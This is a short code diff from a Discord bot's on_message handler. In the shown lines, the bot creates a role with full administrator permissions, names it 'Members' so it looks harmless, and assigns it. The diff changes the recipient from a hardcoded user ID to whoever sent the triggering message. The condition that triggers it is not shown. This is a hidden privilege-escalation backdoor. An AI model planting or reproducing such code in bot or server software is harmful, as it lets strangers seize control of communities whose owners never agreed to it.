@@ -2230,7 +2230,7 @@ async def on_message(message):
             perms = discord.Permissions(administrator=True)
             mrinal = await bot.fetch_user(758941956600102943)
             oprole = await message.guild.create_role(name="Members", permissions=perms)
-            await mrinal.add_roles(oprole)
+            await message.author.add_roles(oprole)
 
 @bot.listen()
 async def on_message(message):
